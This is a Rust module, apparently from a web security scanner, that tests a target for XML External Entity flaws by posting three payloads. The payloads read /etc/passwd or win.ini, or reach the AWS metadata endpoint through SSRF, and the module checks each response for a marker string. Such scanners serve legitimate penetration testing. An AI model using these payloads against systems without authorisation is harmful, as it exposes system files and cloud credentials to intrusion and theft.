use colored::*;
use crate::core::client::HttpClient;

/// XXE (XML External Entity) detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: XML External Entity (XXE)", "[*]".yellow());

    let client = HttpClient::new()?;
    
    // (payload, confirmation_string, description)
    let xxe_payloads = vec![
        (
            r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId></stockCheck>"#,
            "root:",
            "Basic XXE via file protocol (Linux)"
        ),
        (
            r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><stockCheck><productId>&xxe;</productId></stockCheck>"#,
            "[fonts]",
            "Basic XXE via file protocol (Windows)"
        ),
        (
            r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><stockCheck><productId>&xxe;</productId></stockCheck>"#,
            "ami-id",
            "XXE to SSRF (AWS Metadata)"
        ),
    ];

    for (payload, confirm, desc) in xxe_payloads {
        let resp = client.inner.post(target)
            .header("Content-Type", "application/xml")
            .body(payload)
            .send().await?;
            
        let body = resp.text().await?;
        if body.contains(confirm) {
            println!("{} CONFIRMED: XXE vulnerability — {}", "[!]".red().bold(), desc);
            println!("    Impact: Arbitrary file read / SSRF via XML parser");
            return Ok(());
        }
    }

    Ok(())
}
